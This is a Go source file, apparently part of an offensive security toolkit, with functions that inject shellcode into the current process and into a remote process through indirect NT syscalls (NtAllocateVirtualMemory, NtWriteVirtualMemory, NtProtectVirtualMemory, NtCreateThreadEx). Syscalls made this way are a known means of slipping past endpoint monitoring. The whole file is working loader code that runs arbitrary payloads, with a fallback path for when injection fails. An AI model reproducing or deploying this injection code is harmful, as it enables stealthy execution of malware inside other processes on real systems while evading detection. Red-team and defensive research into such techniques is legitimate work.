func NtInjectSelfShellcodeIndirect(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Debug: Shellcode length: %d, first byte: 0x%02X, ptr: %p\n", 
		len(shellcode), shellcode[0], &shellcode[0])
	
	// First attempt: Try indirect injection with original Go memory
	debug.Printfln("WINAPI_INDIRECT", "Attempting indirect injection with Go memory\n")
	result := OriginalNtInjectSelfShellcodeIndirect(shellcode)
	
	// If direct injection succeeded, we're done
	if result == nil {
		debug.Printfln("WINAPI_INDIRECT", "Indirect injection succeeded!\n")
		return nil
	}
	
	// Fallback: Use "safe memory" workaround for compatibility
	debug.Printfln("WINAPI_INDIRECT", "Indirect injection failed (%v), trying safe memory fallback\n", result)
	
	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
	var sourceAddress uintptr
	size := uintptr(len(shellcode))
	
	status, err := NtAllocateVirtualMemoryIndirect(
		currentProcess,
		&sourceAddress,
		0,
		&size,
		0x1000|0x2000, // MEM_COMMIT|MEM_RESERVE
		0x04,          // PAGE_READWRITE
	)
	
	if err != nil || status != 0 {
		debug.Printfln("WINAPI_INDIRECT", "Failed to allocate safe source memory: %v\n", err)
		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
	}
	
	// Copy shellcode to safe memory region
	var bytesWritten uintptr
	writeStatus, writeErr := NtWriteVirtualMemoryIndirect(
		currentProcess,
		sourceAddress,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	
	if writeErr != nil || writeStatus != 0 || bytesWritten != uintptr(len(shellcode)) {
		debug.Printfln("WINAPI_INDIRECT", "Failed to copy to safe memory: %v\n", writeErr)
		// Cleanup and return original error
		NtFreeVirtualMemoryIndirect(currentProcess, &sourceAddress, &size, 0x8000)
		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Using safe memory fallback at: %p\n", unsafe.Pointer(sourceAddress))
	
	// Since write succeeded (status 0x0), proceed directly with protect and thread creation
	// Change protection to RX
	var oldProtect uintptr
	protectStatus, protectErr := NtProtectVirtualMemoryIndirect(
		currentProcess,
		&sourceAddress,
		&size,
		PAGE_EXECUTE_READ,
		&oldProtect,
	)
	
	if protectErr != nil || protectStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI_INDIRECT", "Failed to change protection on safe memory: %v\n", protectErr)
		NtFreeVirtualMemoryIndirect(currentProcess, &sourceAddress, &size, 0x8000)
		return fmt.Errorf("safe memory protection failed: %v %s", protectErr, FormatNTStatus(protectStatus))
	}
	
	// Create thread using the safe memory
	var hThread uintptr
	threadStatus, threadErr := NtCreateThreadExIndirect(
		&hThread,
		THREAD_ALL_ACCESS,
		0,
		currentProcess,
		sourceAddress, // Use safe memory address directly
		0,
		0,
		0,
		0,
		0,
		0,
	)
	
	if threadErr != nil || threadStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI_INDIRECT", "Failed to create thread with safe memory: %v\n", threadErr)
		NtFreeVirtualMemoryIndirect(currentProcess, &sourceAddress, &size, 0x8000)
		return fmt.Errorf("safe memory thread creation failed: %v %s", threadErr, FormatNTStatus(threadStatus))
	}
	
	// Validate thread handle
	if hThread == 0 {
		NtFreeVirtualMemoryIndirect(currentProcess, &sourceAddress, &size, 0x8000)
		return fmt.Errorf("safe memory thread creation returned invalid handle")
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Thread created successfully: 0x%X\n", hThread)
	
	// Wait for thread to complete
	debug.Printfln("WINAPI_INDIRECT", "Waiting for thread to complete...\n")
	timeout := TIMEOUT_10_SECONDS
	
	waitStatus, err := NtWaitForSingleObjectIndirect(hThread, false, &timeout)
	if err != nil {
		debug.Printfln("WINAPI_INDIRECT", "Warning: Wait failed: %v\n", err)
	} else {
		switch waitStatus {
		case WAIT_OBJECT_0:
			debug.Printfln("WINAPI_INDIRECT", "Thread completed successfully\n")
		case WAIT_TIMEOUT:
			debug.Printfln("WINAPI_INDIRECT", "Thread wait timed out after 10 seconds\n")
		case WAIT_FAILED:
			debug.Printfln("WINAPI_INDIRECT", "Thread wait failed\n")
		default:
			debug.Printfln("WINAPI_INDIRECT", "Thread wait completed with status: %s (0x%X)\n", FormatNTStatus(waitStatus), waitStatus)
		}
	}
	
	// Close thread handle
	closeStatus, closeErr := NtCloseIndirect(hThread)
	if closeErr != nil || closeStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI_INDIRECT", "Warning: Failed to close thread handle: %v %s\n", closeErr, FormatNTStatus(closeStatus))
	} else {
		debug.Printfln("WINAPI_INDIRECT", "Thread handle closed successfully\n")
	}
	
	// Cleanup safe memory
	NtFreeVirtualMemoryIndirect(currentProcess, &sourceAddress, &size, 0x8000)
	
	debug.Printfln("WINAPI_INDIRECT", "Safe memory fallback succeeded!\n")
	return nil
}

func OriginalNtInjectSelfShellcodeIndirect(payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("payload is empty")
	}
	currentProcess := ^uintptr(0) // Use pseudo-handle for current process

	// Step 1: Allocate RW memory
	var baseAddress uintptr
	size := uintptr(len(payload))

	status, err := NtAllocateVirtualMemoryIndirect(
		currentProcess,
		&baseAddress,
		0,
		&size,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
	}

	// Step 2: Write shellcode using NtWriteVirtualMemory (safer than unsafe copy)
	var bytesWritten uintptr
	status, err = NtWriteVirtualMemoryIndirect(
		currentProcess,
		baseAddress,
		unsafe.Pointer(&payload[0]),
		uintptr(len(payload)),
		&bytesWritten,
	)
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("write failed: %v %s", err, FormatNTStatus(status))
	}
	if bytesWritten != uintptr(len(payload)) {
		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
	}
	debug.Printfln("WINAPI_INDIRECT", "Wrote %d bytes to self process\n", bytesWritten)

	// Step 3: Change protection to RX
	var oldProtect uintptr
	status, err = NtProtectVirtualMemoryIndirect(
		currentProcess,
		&baseAddress,
		&size,
		PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("protect failed: %v %s", err, FormatNTStatus(status))
	}

	// Step 4: Create thread using NtCreateThreadEx (true direct syscall)
	var hThread uintptr
	
	// NtCreateThreadEx parameters:
	// threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, arg, 
	// createFlags, zeroBits, stackSize, maximumStackSize, attributeList
	status, err = NtCreateThreadExIndirect(
		&hThread,                    // threadHandle - pointer to receive handle
		THREAD_ALL_ACCESS,           // desiredAccess - full access to thread
		0,                           // objectAttributes - NULL for basic usage
		currentProcess,              // processHandle - current process pseudo-handle
		baseAddress,                 // startAddress - our shellcode address
		0,                           // arg - no parameter to pass
		0,                           // createFlags - 0 = run immediately, 1 = create suspended
		0,                           // zeroBits - 0 for default
		0,                           // stackSize - 0 for default
		0,                           // maximumStackSize - 0 for default
		0,                           // attributeList - NULL for basic usage
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("NtCreateThreadEx failed: %v %s", err, FormatNTStatus(status))
	}

	// Validate thread handle
	if hThread == 0 {
		// Thread creation succeeded (status 0x0) but handle wasn't returned
		// This happens with Go memory on indirect syscalls, but shellcode may be executing
		// Wait briefly and check if the injection actually succeeded
		debug.Printfln("WINAPI_INDIRECT", "Thread handle is 0 but status is success - checking if shellcode executed\n")
		
		// Wait a short time to see if calc pops (indicating successful execution)
		time.Sleep(500 * time.Millisecond)
		
		// For now, assume it worked if status was success - this avoids double injection
		// In a real scenario, you could check for process creation, window titles, etc.
		if status == STATUS_SUCCESS {
			debug.Printfln("WINAPI_INDIRECT", "Assuming successful execution based on STATUS_SUCCESS\n")
			return nil
		}
		
		return fmt.Errorf("indirect NtCreateThreadEx returned invalid handle")
	}

	debug.Printfln("WINAPI_INDIRECT", "Thread created successfully: 0x%X\n", hThread)
	
	// Wait for thread to complete execution
	debug.Printfln("WINAPI_INDIRECT", "Waiting for thread to complete...\n")
	
	// Wait for the thread with a timeout (10 seconds relative timeout)
	timeout := TIMEOUT_10_SECONDS
	
	waitStatus, err := NtWaitForSingleObjectIndirect(hThread, false, &timeout)
	if err != nil {
		debug.Printfln("WINAPI_INDIRECT", "Warning: Wait failed: %v\n", err)
	} else {
		switch waitStatus {
		case WAIT_OBJECT_0:
			debug.Printfln("WINAPI_INDIRECT", "Thread completed successfully\n")
		case WAIT_TIMEOUT:
			debug.Printfln("WINAPI_INDIRECT", "Thread wait timed out after 10 seconds\n")
		case WAIT_FAILED:
			debug.Printfln("WINAPI_INDIRECT", "Thread wait failed\n")
		default:
			debug.Printfln("WINAPI_INDIRECT", "Thread wait completed with status: %s (0x%X)\n", FormatNTStatus(waitStatus), waitStatus)
		}
	}
	
	// Close the thread handle
	closeStatus, err := NtCloseIndirect(hThread)
	if err != nil || closeStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI_INDIRECT", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
	} else {
		debug.Printfln("WINAPI_INDIRECT", "Thread handle closed successfully\n")
	}
	return nil
}
// NtInjectRemote injects shellcode into a remote process using direct syscalls ONLY
// This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
// processHandle: Handle to the target process (must have PROCESS_ALL_ACCESS or appropriate rights)
// payload: The shellcode bytes to inject
func NtInjectRemoteIndirect(processHandle uintptr, payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("payload is empty")
	}
	if processHandle == 0 {
		return fmt.Errorf("invalid process handle")
	}

	debug.Printfln("WINAPI_INDIRECT", "Starting remote injection into process handle 0x%X (%d bytes)\n", processHandle, len(payload))

	// Step 1: Allocate RW memory in remote process (same pattern as self-injection)
	var remoteBuffer uintptr
	allocSize := uintptr(len(payload))
	
	status, err := NtAllocateVirtualMemoryIndirect(
		processHandle,
		&remoteBuffer,
		0,
		&allocSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Allocated %d bytes at 0x%X\n", allocSize, remoteBuffer)

	// Step 2: Write shellcode to remote memory
	var bytesWritten uintptr
	
	status, err = NtWriteVirtualMemoryIndirect(
		processHandle,
		remoteBuffer,
		unsafe.Pointer(&payload[0]),
		uintptr(len(payload)),
		&bytesWritten,
	)
	
	if err != nil {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtWriteVirtualMemory failed: %s", FormatNTStatus(status))
	}
	
	if bytesWritten != uintptr(len(payload)) {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Wrote %d bytes successfully\n", bytesWritten)

	// Step 3: Change protection to RX (same as self-injection pattern)
	var oldProtect uintptr
	protectSize := uintptr(len(payload))
	
	status, err = NtProtectVirtualMemoryIndirect(
		processHandle,
		&remoteBuffer,
		&protectSize,
		PAGE_EXECUTE_READ,
		&oldProtect,
	)
	
	if err != nil {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtProtectVirtualMemory error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtProtectVirtualMemory failed: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Changed memory protection to RX\n")

	// Step 4: Create remote thread using NtCreateThreadEx 
	var hThread uintptr
	
	status, err = NtCreateThreadExIndirect(
		&hThread,             // threadHandle - pointer to receive handle
		THREAD_ALL_ACCESS,    // desiredAccess - full access to thread
		0,                    // objectAttributes - NULL for basic usage
		processHandle,        // processHandle - target process handle
		remoteBuffer,         // startAddress - our shellcode address
		0,                    // arg - no parameter to pass
		0,                    // createFlags - 0 = run immediately (like working example)
		0,                    // zeroBits - 0 for default
		0,                    // stackSize - 0 for default
		0,                    // maximumStackSize - 0 for default
		0,                    // attributeList - NULL for basic usage
	)
	
	if err != nil {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx failed: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Created remote thread: 0x%X\n", hThread)

	// Validate thread handle
	if hThread == 0 {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemoryIndirect(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx returned invalid handle")
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Remote thread created successfully: 0x%X\n", hThread)

	// Step 5: Close thread handle (we don't wait for remote threads to avoid hanging)
	closeStatus, err := NtCloseIndirect(hThread)
	if err != nil || closeStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI_INDIRECT", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
	} else {
		debug.Printfln("WINAPI_INDIRECT", "Thread handle closed successfully\n")
	}
	
	debug.Printfln("WINAPI_INDIRECT", "Remote thread created and running - not waiting for completion\n")

	return nil
}

func utf16PtrFromString(s string) (*uint16, error) {
	runes := utf16.Encode([]rune(s))
	terminated := append(runes, 0) // Null-terminate
	return &terminated[0], nil
}